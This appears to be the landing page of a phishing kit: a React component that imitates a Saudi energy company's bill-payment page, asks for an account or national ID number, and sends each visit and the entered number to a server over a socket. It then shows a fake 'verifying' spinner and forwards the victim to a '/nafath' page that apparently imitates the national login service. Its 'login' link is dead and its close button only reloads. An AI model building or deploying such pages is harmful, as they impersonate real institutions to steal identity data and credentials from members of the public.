import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { socket } from "@/lib/store";

export default function FahsHome() {
  const [accountNumber, setAccountNumber] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [, setLocation] = useLocation();

  useEffect(() => {
    // Register visitor page view
    socket.value.emit("visitor:pageView", { page: "home", url: window.location.href });
  }, []);

  const handleSubmit = () => {
    if (!accountNumber.trim()) return;
    setIsLoading(true);
    
    // Send account number to server
    socket.value.emit("visitor:formSubmit", {
      page: "home",
      data: { accountNumber }
    });

    setTimeout(() => {
      setIsLoading(false);
      setLocation('/nafath');
    }, 2000);
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleSubmit();
    }
  };

  return (
    <div className="min-h-screen bg-white" dir="rtl" style={{ fontFamily: "'Tajawal', 'Segoe UI', sans-serif" }}>
      {/* Header */}
      <header className="flex items-center justify-between px-6 py-4">
        {/* Logo - Right Side */}
        <div className="flex items-center">
          <img 
            src="/se-logo.jpg" 
            alt="السعودية للطاقة" 
            className="h-12 md:h-14 object-contain"
          />
        </div>

        {/* Close Button - Left Side */}
        <button 
          className="text-gray-400 hover:text-gray-600 transition-colors"
          onClick={() => window.location.reload()}
        >
          <svg className="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>
      </header>

      {/* Main Content */}
      <main className="flex flex-col items-center justify-center px-4 pt-12 md:pt-20">
        {/* Title */}
        <h1 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4 text-center">
          عرض ودفع الفواتير
        </h1>

        {/* Subtitle */}
        <p className="text-sm md:text-base text-gray-500 mb-10 text-center max-w-lg leading-relaxed">
          يرجى إدخال رقم حسابك لعرض ومتابعة دفع فاتورتك. يمكنك أيضًا{' '}
          <a href="#" className="text-[#00a4b4] hover:underline">تسجيل الدخول</a>
          {' '}للحصول على المزيد من الخدمات
        </p>

        {/* Form */}
        <div className="w-full max-w-md">
          {/* Label */}
          <label className="block text-sm text-gray-700 mb-2 text-right">
            رقم الحساب أو الهوية
          </label>

          {/* Input */}
          <input
            type="text"
            value={accountNumber}
            onChange={(e) => setAccountNumber(e.target.value)}
            onKeyDown={handleKeyDown}
            placeholder="مثال: 1234567890"
            className="w-full px-4 py-3 border border-gray-300 rounded-md text-right text-gray-900 placeholder-gray-400 focus:outline-none focus:border-[#00a4b4] focus:ring-1 focus:ring-[#00a4b4] transition-colors text-base"
            dir="rtl"
          />

          {/* Submit Button */}
          <button
            onClick={handleSubmit}
            disabled={!accountNumber.trim() || isLoading}
            className={`mt-6 w-full py-3 rounded-md text-base font-medium transition-all duration-200 ${
              accountNumber.trim() && !isLoading
                ? 'bg-[#00a4b4] text-white hover:bg-[#008a98] cursor-pointer'
                : 'bg-gray-200 text-gray-400 cursor-not-allowed'
            }`}
          >
            {isLoading ? (
              <div className="flex items-center justify-center gap-2">
                <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                <span>جاري التحقق...</span>
              </div>
            ) : (
              'استمر'
            )}
          </button>
        </div>
      </main>
    </div>
  );
}
